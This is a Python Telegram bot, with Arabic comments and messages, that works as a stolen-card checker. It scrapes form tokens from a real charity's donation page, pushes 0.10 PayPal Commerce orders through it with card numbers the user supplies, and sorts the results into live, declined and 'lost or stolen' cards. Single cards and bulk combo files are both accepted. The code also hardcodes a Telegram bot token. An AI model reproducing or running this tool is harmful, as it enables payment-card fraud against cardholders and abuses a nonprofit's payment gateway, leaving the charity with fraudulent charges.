import telebot
import requests
import base64
import re
import time
from user_agent import generate_user_agent
from requests_toolbelt.multipart.encoder import MultipartEncoder
import os

# استخدام متغير بيئة للتوكن لزيادة الأمان عند الرفع على GitHub
TOKEN = os.getenv('BOT_TOKEN', '8709460165:AAFnoYKpwLGINPx7002oAXnHk0dEPUqyFuI')
bot = telebot.TeleBot(TOKEN)

def kefara(ccx):
    try:
        r = requests.Session()
        user = generate_user_agent()
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) < 4:
            return "❌ Invalid Format"
        
        n = parts[0]
        mm = parts[1]
        yy = parts[2]
        cvc = parts[3].strip()
        
        if "20" in yy and len(yy) == 4:
            yy = yy.split("20")[1]
            
        headers = {'user-agent': user}
        
        response = r.get('https://www.northidahowaterpolo.org/donations/donation-form/', headers=headers)
        id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text).group(1)
        id_form2 = re.search(r'name="give-form-id" value="(.*?)"', response.text).group(1)
        nonec = re.search(r'name="give-form-hash" value="(.*?)"', response.text).group(1)
        
        enc = re.search(r'"data-client-token":"(.*?)"', response.text).group(1)
        dec = base64.b64decode(enc).decode('utf-8')
        au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
        
        headers = {
            'origin': 'https://www.northidahowaterpolo.org',
            'referer': 'https://www.northidahowaterpolo.org/donations/donation-form/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user,
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'give-honeypot': '',
            'give-form-id-prefix': id_form1,
            'give-form-id': id_form2,
            'give-form-title': '',
            'give-current-url': 'https://www.northidahowaterpolo.org/donations/donation-form/',
            'give-form-url': 'https://www.northidahowaterpolo.org/donations/donation-form/',
            'give-form-minimum': '0.10',
            'give-form-maximum': '999999.99',
            'give-form-hash': nonec,
            'give-price-id': '3',
            'give-recurring-logged-in-only': '',
            'give-logged-in-only': '1',
            '_give_is_donation_recurring': '0',
            'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
            'give-amount': '0.10',
            'give_stripe_payment_method': '',
            'payment-mode': 'paypal-commerce',
            'give_first': 'KEFARA',
            'give_last': 'rights and',
            'give_email': 'kefara22@gmail.com',
            'card_name': 'kefafa ',
            'card_exp_month': '',
            'card_exp_year': '',
            'give_action': 'purchase',
            'give-gateway': 'paypal-commerce',
            'action': 'give_process_donation',
            'give_ajax': 'true',
        }
        
        r.post('https://www.northidahowaterpolo.org/wp-admin/admin-ajax.php', headers=headers, data=data)
        
        multipart_data = MultipartEncoder({
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, id_form1),
            'give-form-id': (None, id_form2),
            'give-form-title': (None, ''),
            'give-current-url': (None, 'https://www.northidahowaterpolo.org/donations/donation-form/'),
            'give-form-url': (None, 'https://www.northidahowaterpolo.org/donations/donation-form/'),
            'give-form-minimum': (None, '0.10'),
            'give-form-maximum': (None, '999999.99'),
            'give-form-hash': (None, nonec),
            'give-price-id': (None, '3'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, '1'),
            '_give_is_donation_recurring': (None, '0'),
            'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
            'give-amount': (None, '0.10'),
            'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, 'KEFARA'),
            'give_last': (None, 'rights and'),
            'give_email': (None, 'kefara22@gmail.com'),
            'card_name': (None, 'kefara '),
            'card_exp_month': (None, ''),
            'card_exp_year': (None, ''),
            'give-gateway': (None, 'paypal-commerce'),
        })
        
        headers['content-type'] = multipart_data.content_type
        params = {'action': 'give_paypal_commerce_create_order'}
        
        response = r.post('https://www.northidahowaterpolo.org/wp-admin/admin-ajax.php', params=params, headers=headers, data=multipart_data)
        tok = response.json()['data']['id']
        
        headers_paypal = {
            'authority': 'cors.api.paypal.com',
            'accept': '*/*',
            'authorization': f'Bearer {au}',
            'braintree-sdk-version': '3.32.0-payments-sdk-dev',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
            'referer': 'https://assets.braintreegateway.com/',
            'user-agent': user,
        }
        
        json_data = {
            'payment_source': {
                'card': {
                    'number': n,
                    'expiry': f'20{yy}-{mm}',
                    'security_code': cvc,
                    'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
                },
            },
            'application_context': {'vault': False},
        }
        
        r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=headers_paypal, json=json_data)
        
        multipart_approve = MultipartEncoder({
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, id_form1),
            'give-form-id': (None, id_form2),
            'give-form-title': (None, ''),
            'give-current-url': (None, 'https://www.northidahowaterpolo.org/donations/donation-form/'),
            'give-form-url': (None, 'https://www.northidahowaterpolo.org/donations/donation-form/'),
            'give-form-minimum': (None, '0.10'),
            'give-form-maximum': (None, '999999.99'),
            'give-form-hash': (None, nonec),
            'give-price-id': (None, '3'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, '1'),
            '_give_is_donation_recurring': (None, '0'),
            'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
            'give-amount': (None, '0.10'),
            'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, 'KEFARA'),
            'give_last': (None, 'rights and'),
            'give_email': (None, 'kefara22@gmail.com'),
            'card_name': (None, 'kefara '),
            'card_exp_month': (None, ''),
            'card_exp_year': (None, ''),
            'give-gateway': (None, 'paypal-commerce'),
        })
        
        headers['content-type'] = multipart_approve.content_type
        params_approve = {'action': 'give_paypal_commerce_approve_order', 'order': tok}
        
        response = r.post('https://www.northidahowaterpolo.org/wp-admin/admin-ajax.php', params=params_approve, headers=headers, data=multipart_approve)
        
        text = response.text
        if 'true' in text or 'sucsess' in text: return "✅ Charge !"
        elif 'DO_NOT_HONOR' in text: return "❌ Do not honor"
        elif 'ACCOUNT_CLOSED' in text or 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text: return "❌ Account closed"
        elif 'LOST_OR_STOLEN' in text: return "❌ LOST OR STOLEN"
        elif 'CVV2_FAILURE' in text: return "❌ Card Issuer Declined CVV"
        elif 'SUSPECTED_FRAUD' in text: return "❌ SUSPECTED FRAUD"
        elif 'INVALID_ACCOUNT' in text: return '❌ INVALID_ACCOUNT'
        elif 'REATTEMPT_NOT_PERMITTED' in text: return "❌ REATTEMPT NOT PERMITTED"
        elif 'ACCOUNT BLOCKED BY ISSUER' in text: return "❌ ACCOUNT_BLOCKED_BY_ISSUER"
        elif 'ORDER_NOT_APPROVED' in text: return '❌ ORDER_NOT_APPROVED'
        elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text: return '❌ PICKUP_CARD_SPECIAL_CONDITIONS'
        elif 'PAYER_CANNOT_PAY' in text: return "❌ PAYER CANNOT PAY"
        elif 'INSUFFICIENT_FUNDS' in text: return '❌ Insufficient Funds'
        elif 'GENERIC_DECLINE' in text: return '❌ GENERIC_DECLINE'
        elif 'COMPLIANCE_VIOLATION' in text: return "❌ COMPLIANCE VIOLATION"
        elif 'TRANSACTION_NOT PERMITTED' in text: return "❌ TRANSACTION NOT PERMITTED"
        elif 'PAYMENT_DENIED' in text: return '❌ PAYMENT_DENIED'
        elif 'INVALID_TRANSACTION' in text: return "❌ INVALID TRANSACTION"
        elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text: return "❌ RESTRICTED OR INACTIVE ACCOUNT"
        elif 'SECURITY_VIOLATION' in text: return '❌ SECURITY_VIOLATION'
        elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text: return "❌ DECLINED DUE TO UPDATED ACCOUNT"
        elif 'INVALID_OR_RESTRICTED_CARD' in text: return "❌ INVALID CARD"
        elif 'EXPIRED_CARD' in text: return "❌ EXPIRED CARD"
        elif 'CRYPTOGRAPHIC_FAILURE' in text: return "❌ CRYPTOGRAPHIC FAILURE"
        elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text: return "❌ TRANSACTION CANNOT BE COMPLETED"
        elif 'DECLINED_PLEASE_RETRY' in text: return "❌ DECLINED PLEASE RETRY LATER"
        elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text: return "❌ EXCEED LIMIT"
        else:
            try:
                err = response.json()['data']['error']
                return f"❌ {err}"
            except:
                return "❌ UNKNOWN_ERROR"
    except Exception as e:
        return f"⚠️ Error: {str(e)}"

def format_result(combo, result):
    # تنسيق الرسالة بشكل جذاب مع إيموجيات
    status_icon = "💳"
    if "Charge" in result:
        status_icon = "🔥"
    elif "Insufficient Funds" in result:
        status_icon = "💰"
    
    msg = f"━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"✨ **Card Check Result** ✨\n"
    msg += f"━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"📍 **Card:** `{combo}`\n"
    msg += f"💠 **Status:** {result} {status_icon}\n"
    msg += f"🌐 **Gateway:** PayPal Commerce\n"
    msg += f"━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"👤 **Checked By:** @{bot.get_me().username}\n"
    return msg

@bot.message_handler(commands=['start'])
def start(message):
    welcome_text = (
        "👋 **أهلاً بك في بوت فحص البطاقات المتطور!**\n\n"
        "🚀 **الأوامر المتاحة:**\n"
        "• `/pp [combo]` : لفحص بطاقة واحدة.\n"
        "• قم برفع ملف `.txt` لفحص مجموعة بطاقات.\n\n"
        "✨ **تنسيق الكومبو:** `الرقم|الشهر|السنة|CVC`"
    )
    bot.reply_to(message, welcome_text, parse_mode='Markdown')

@bot.message_handler(commands=['pp'])
def check_pp(message):
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ **يرجى إرسال الكومبو بعد الأمر!**\nمثال: `/pp 4217834081794714|11|26|614`", parse_mode='Markdown')
        return
    
    combo = args[1]
    msg = bot.reply_to(message, "🔍 **جاري الفحص... يرجى الانتظار**", parse_mode='Markdown')
    result = kefara(combo)
    bot.edit_message_text(format_result(combo, result), message.chat.id, msg.message_id, parse_mode='Markdown')

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    if message.document.file_name.endswith('.txt'):
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        with open("temp_combo.txt", 'wb') as new_file:
            new_file.write(downloaded_file)
            
        status_msg = bot.reply_to(message, "📥 **تم استلام الملف، جاري معالجة البطاقات...**", parse_mode='Markdown')
        
        with open("temp_combo.txt", 'r') as f:
            lines = [line.strip() for line in f.readlines() if line.strip()]
            
        results = []
        total = len(lines)
        
        for i, line in enumerate(lines):
            res = kefara(line)
            results.append(f"🔹 `{line}` -> {res}")
            # تحديث الحالة كل 5 بطاقات لتجنب حظر التلجرام
            if (i + 1) % 5 == 0:
                bot.edit_message_text(f"⏳ **جاري الفحص: {i+1}/{total}**", message.chat.id, status_msg.message_id, parse_mode='Markdown')
                
        output = "📊 **نتائج الفحص الجماعي:**\n\n" + "\n".join(results)
        
        if len(output) > 4000:
            with open("results.txt", "w") as f:
                f.write(output)
            with open("results.txt", "rb") as f:
                bot.send_document(message.chat.id, f, caption="✅ **اكتمل الفحص! تم إرسال النتائج في ملف.**")
        else:
            bot.edit_message_text(output, message.chat.id, status_msg.message_id, parse_mode='Markdown')
        
        if os.path.exists("temp_combo.txt"):
            os.remove("temp_combo.txt")
    else:
        bot.reply_to(message, "⚠️ **يرجى رفع ملف بصيغة .txt فقط!**", parse_mode='Markdown')

if __name__ == "__main__":
    print("Bot is starting with premium look...")
    bot.infinity_polling()
